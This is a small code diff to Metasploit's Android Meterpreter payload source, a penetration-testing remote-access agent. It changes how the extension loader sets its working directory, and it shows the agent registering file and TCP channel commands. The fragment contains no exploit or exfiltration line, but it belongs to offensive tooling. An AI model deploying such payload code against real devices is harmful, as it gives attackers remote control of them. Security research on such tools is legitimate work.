@@ -1,6 +1,7 @@
 package com.metasploit.meterpreter;
 
 import java.io.DataInputStream;
+import java.io.File;
 import java.io.OutputStream;
 
 import android.content.Context;
@@ -53,7 +54,7 @@ public class AndroidMeterpreter extends Meterpreter {
     public String[] loadExtension(byte[] data) throws Exception {
         getCommandManager().resetNewCommands();
         CommandManager mgr =  getCommandManager();
-        Loader.cwd = context.getFilesDir().getAbsoluteFile();
+        Loader.cwd = new File(".").getAbsoluteFile();
         mgr.registerCommand("channel_create_stdapi_fs_file", channel_create_stdapi_fs_file.class);
         mgr.registerCommand("channel_create_stdapi_net_tcp_client", channel_create_stdapi_net_tcp_client.class);
         mgr.registerCommand("channel_create_stdapi_net_tcp_server", channel_create_stdapi_net_tcp_server.class);
